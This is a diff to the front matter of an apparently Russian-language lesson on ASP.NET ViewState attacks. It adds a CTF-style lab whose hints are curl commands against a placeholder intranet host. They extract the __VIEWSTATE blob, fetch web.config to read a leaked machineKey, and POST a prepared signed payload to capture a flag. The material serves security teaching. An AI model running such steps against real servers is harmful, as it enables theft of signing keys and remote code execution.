@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 45
 summary: "ASP.NET ViewState: machineKey, подделка и RCE через ysoserial.net, ViewStateUserKey и обход MAC."
+lab:
+  kind: shell
+  title: "Практика: .NET ViewState"
+  toolset: [core, curl, xxd, base64]
+  workdir: /home/student/task
+  files: [task.md, payload.txt]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Вытащи blob из страницы: `curl -s https://intranet.example/Default.aspx | grep __VIEWSTATE`.
+    - Проверь утечку конфига: `curl -s https://intranet.example/web.config | grep -i machinekey`.
+    - Готовый подписанный payload лежит в `payload.txt` (посмотри `cat payload.txt`).
+    - Отправь его: `curl -s -X POST https://intranet.example/Default.aspx --data-urlencode "__VIEWSTATE=/wEPDwUKLTY4NTk0NTI4OQ9kFgICAw9kFgICAQ8PFgIeBFRleHQFAT5kZA==" | grep 'nto{' > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
